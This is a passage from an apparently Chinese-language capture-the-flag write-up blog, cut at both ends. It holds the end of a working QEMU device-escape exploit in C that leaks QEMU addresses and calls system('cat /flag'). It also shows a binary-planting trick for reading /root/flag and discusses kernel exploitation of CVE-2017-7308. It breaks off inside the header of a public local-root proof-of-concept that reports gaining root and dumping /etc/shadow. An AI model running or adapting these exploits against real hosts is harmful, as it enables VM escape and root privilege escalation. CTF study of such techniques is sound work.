class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">misx_mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(misx_mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">misx_pba_mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(misx_mmio_mem + <span class="number">0x800</span> + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    outb(value,pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint64_t</span>)inb(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_cmd</span><span class="params">()</span>&#123;</span><br><span class="line">  misx_pba_mmio_read(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_cmd</span><span class="params">(<span class="type">int8_t</span> value)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set cmd %d\\n&quot;</span>, value);</span><br><span class="line">  reset_cmd();</span><br><span class="line">  <span class="keyword">if</span>(value != <span class="number">1</span>)&#123;</span><br><span class="line">    misx_mmio_write(<span class="number">0</span>, value, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_encode_func</span><span class="params">()</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  misx_mmio_write(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_encode</span><span class="params">()</span>&#123;</span><br><span class="line">  misx_pba_mmio_read(<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_key</span><span class="params">(<span class="type">uint8_t</span> *value, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set key\\n&quot;</span>);</span><br><span class="line">  set_cmd(<span class="number">1</span>);</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i&lt; len; i++)&#123;</span><br><span class="line">    misx_pba_mmio_write(i, value[i], <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_input</span><span class="params">(<span class="type">uint8_t</span> *value, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set input\\n&quot;</span>);</span><br><span class="line">  set_cmd(<span class="number">2</span>);</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0x80</span>; i&lt; len + <span class="number">0x80</span>; i++)&#123;</span><br><span class="line">    misx_pba_mmio_write(i, value[i - <span class="number">0x80</span>], <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_mode</span><span class="params">(<span class="type">uint8_t</span> value)</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">2</span>);</span><br><span class="line">  misx_mmio_write(<span class="number">0</span>, value, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">call_encode</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call encode\\n&quot;</span>);</span><br><span class="line">  set_mode(<span class="number">1</span>);</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  misx_mmio_read(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_output</span><span class="params">(<span class="type">uint8_t</span> *buf, <span class="type">int</span> offset,  <span class="type">int</span> len)</span>&#123;</span><br><span class="line">  set_cmd(<span class="number">3</span>);</span><br><span class="line">  <span class="comment">// offset += 0x110;</span></span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = offset; i &lt; offset + len; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;current reading is %p\\n&quot;</span>, offset);</span><br><span class="line">    buf[i-offset] = misx_pba_mmio_read(i, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">  system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> misx_mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource4&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (misx_mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;misx_mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  misx_mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, misx_mmio_fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (misx_mmio_mem == MAP_FAILED)</span><br><span class="line">    die(<span class="string">&quot;mmap misx_mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;iopl 3 failed\\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">  set_encode_func();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set encode function finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">1</span>, <span class="number">0x300</span>);</span><br><span class="line"></span><br><span class="line">  set_key(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set key finished\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">2</span>, <span class="number">0x300</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;set input finished\\n&quot;</span>);</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  get_output(buf, <span class="number">0x190</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="type">uint64_t</span> elf_address = *(<span class="type">uint64_t</span> *)buf;</span><br><span class="line">  <span class="type">uint64_t</span> qemu_base = elf_address - <span class="number">0x4fa470</span>;</span><br><span class="line">  <span class="type">uint64_t</span> system_plt = qemu_base + <span class="number">0x2a6bb0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;leak elf address is %p\\n&quot;</span>, elf_address);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;qemu base is %p\\n&quot;</span>, qemu_base);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system plt address is %p\\n&quot;</span>, system_plt);</span><br><span class="line"></span><br><span class="line">  reset_encode();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;cat /flag       &quot;</span>);</span><br><span class="line"></span><br><span class="line">  set_key(buf, <span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf, &amp;system_plt, <span class="number">0x8</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x8</span>);</span><br><span class="line">  call_encode();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">1</span>, <span class="number">0x300</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf, &amp;system_plt, <span class="number">0x6</span>);</span><br><span class="line">  set_input(buf, <span class="number">0x80</span>);</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">  getchar();</span><br><span class="line">  call_encode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="W2L"><a href="#W2L" class="headerlink" title="W2L"></a>W2L</h2><p>看了NULL的题解，发现权限配置错误可以直接非预期。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> bin bin1</span><br><span class="line">/bin1/mkdir bin</span><br><span class="line">/bin1/chmod 777 bin</span><br><span class="line">/bin1/echo <span class="string">&quot;/bin1/cat /root/flag&quot;</span> &gt; /bin/umount</span><br><span class="line">/bin1/chmod 777 /bin/umount</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目是拿CVE-2017-7308这个漏洞改的。具体的漏洞分析在另一个文件中。这里给出的脚本中关闭了<code>smep,smap</code>。没有开启<code>KASLR</code>。那么其实拿漏洞的<code>poc</code>改一下就行了。</p>
<h3 id="未开启KASLR"><a href="#未开启KASLR" class="headerlink" title="未开启KASLR"></a>未开启KASLR</h3><p>一种方式是和之前漏洞利用相同，覆写timer_list将代码指向用户空间执行提权脚本。还有一种方法就是多个<code>fork</code>。利用<code>cred_jar</code>这个<code>slab</code>内存对象分配完毕之后也需要申请页面来创建新的<code>slab</code>来达到覆写的目的。第二种方法这里需要调试一下一个<code>slab</code>占用的页面的大小，每一个<code>cred_jar</code>的<code>slab</code>占用的是一个页面的大小。</p>
<h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A proof-of-concept local root exploit for CVE-2017-7308.</span></span><br><span class="line"><span class="comment">// Includes a SMEP &amp; SMAP bypass.</span></span><br><span class="line"><span class="comment">// Tested on 4.8.0-41-generic Ubuntu kernel.</span></span><br><span class="line"><span class="comment">// &lt;https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-7308&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">// Linux ubuntu 4.8.0-41-generic #44~16.04.1-Ubuntu SMP Fri Mar 3 ...</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ gcc pwn.c -o pwn</span></span><br><span class="line"><span class="comment">// user@ubuntu:~$ ./pwn</span></span><br><span class="line"><span class="comment">// [.] starting</span></span><br><span class="line"><span class="comment">// [.] namespace sandbox set up</span></span><br><span class="line"><span class="comment">// [.] KASLR bypass enabled, getting kernel addr</span></span><br><span class="line"><span class="comment">// [.] done, kernel text:   ffffffff87000000</span></span><br><span class="line"><span class="comment">// [.] commit_creds:        ffffffff870a5cf0</span></span><br><span class="line"><span class="comment">// [.] prepare_kernel_cred: ffffffff870a60e0</span></span><br><span class="line"><span class="comment">// [.] native_write_cr4:    ffffffff87064210</span></span><br><span class="line"><span class="comment">// [.] padding heap</span></span><br><span class="line"><span class="comment">// [.] done, heap is padded</span></span><br><span class="line"><span class="comment">// [.] SMEP &amp; SMAP bypass enabled, turning them off</span></span><br><span class="line"><span class="comment">// [.] done, SMEP &amp; SMAP should be off now</span></span><br><span class="line"><span class="comment">// [.] executing get root payload 0x401516</span></span><br><span class="line"><span class="comment">// [.] done, should be root now</span></span><br><span class="line"><span class="comment">// [.] checking if we got root</span></span><br><span class="line"><span class="comment">// [+] got r00t ^_^</span></span><br><span class="line"><span class="comment">// root@ubuntu:/home/user# cat /etc/shadow</span></span><br><span class="line"><span class="comment">// root:!:17246:0:99999:7:::</span></span><br><span class="line"><span class="comment">// daemon:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// bin:*:17212:0:99999:7:::</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Andrey Konovalov &lt;andreyknvl@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 